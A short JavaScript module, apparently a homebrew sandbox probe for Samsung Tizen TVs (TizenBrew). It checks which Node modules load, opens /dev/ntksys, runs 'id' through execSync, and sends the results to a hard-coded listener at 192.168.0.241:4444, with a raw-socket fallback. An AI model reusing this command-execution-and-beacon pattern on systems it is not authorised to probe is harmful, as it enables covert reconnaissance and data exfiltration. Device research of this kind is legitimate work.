// TizenBrew service module v2 - diagnostic
// Try each module individually to find what's available in the sandbox

try {
  const http = require('http');
  const BEACON = 'http://192.168.0.241:4444/';

  const lines = [];
  lines.push('=== TizenBrew sandbox probe ===');

  // What require gives us
  const mods = ['fs','net','http','child_process','os','path','crypto','util'];
  for (const m of mods) {
    try { require(m); lines.push('require(' + m + '): OK'); }
    catch(e) { lines.push('require(' + m + '): FAIL - ' + e.message); }
  }

  // Check /dev/ntksys via fs
  try {
    const fs = require('fs');
    const fd = fs.openSync('/dev/ntksys', 'r+');
    lines.push('/dev/ntksys: EXISTS (fd=' + fd + ')');
    fs.closeSync(fd);
  } catch(e) {
    lines.push('/dev/ntksys: ' + e.message);
  }

  // exec id
  try {
    const { execSync } = require('child_process');
    lines.push('id: ' + execSync('id', { timeout: 3000 }).toString().trim());
  } catch(e) {
    lines.push('id exec: ' + e.message);
  }

  // Send back via HTTP GET to beacon
  const body = lines.join('\n');
  const opts = {
    method: 'POST',
    hostname: '192.168.0.241',
    port: 4444,
    path: '/',
    headers: { 'Content-Length': Buffer.byteLength(body) }
  };
  const req = http.request(opts, () => {});
  req.on('error', () => {});
  req.write(body);
  req.end();

} catch(e) {
  // Last resort: try net directly
  try {
    const net = require('net');
    const s = new net.Socket();
    s.connect(4444, '192.168.0.241', () => { s.write('CRASH: ' + e.message + '\n' + (e.stack||'')); s.end(); });
  } catch(e2) {}
}
